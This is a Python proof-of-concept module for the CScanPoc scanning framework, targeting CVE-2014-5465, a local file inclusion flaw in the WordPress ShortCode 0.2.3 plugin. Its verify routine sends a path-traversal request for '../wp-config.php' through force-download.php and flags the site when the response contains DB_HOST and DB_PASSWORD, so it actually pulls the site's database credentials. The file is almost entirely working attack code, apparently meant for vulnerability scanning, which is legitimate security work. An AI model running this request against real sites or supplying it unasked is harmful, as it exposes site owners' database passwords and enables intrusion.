# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'WordPress_0089' # 平台漏洞编号，留空
    name = 'WordPress Plugin ShortCode 0.2.3 - Local File Inclusion' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2014-08-28'  # 漏洞公布时间
    desc = '''
        WordPress Plugin ShortCode 0.2.3 - Local File Inclusion
    ''' # 漏洞描述
    ref = 'http://www.exploit-db.com/exploits/34436/' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'CVE-2014-5465' #cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Plugin ShortCode 0.2.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3ed267bd-0810-4403-ada8-22d47e003d91'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg + "/wp-content/force-download.php?file=../wp-config.php"
            code, head, res, errcode,finalurl =  hh.http(url)
            if res.find('DB_HOST') != -1 and res.find('DB_PASSWORD') != -1:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()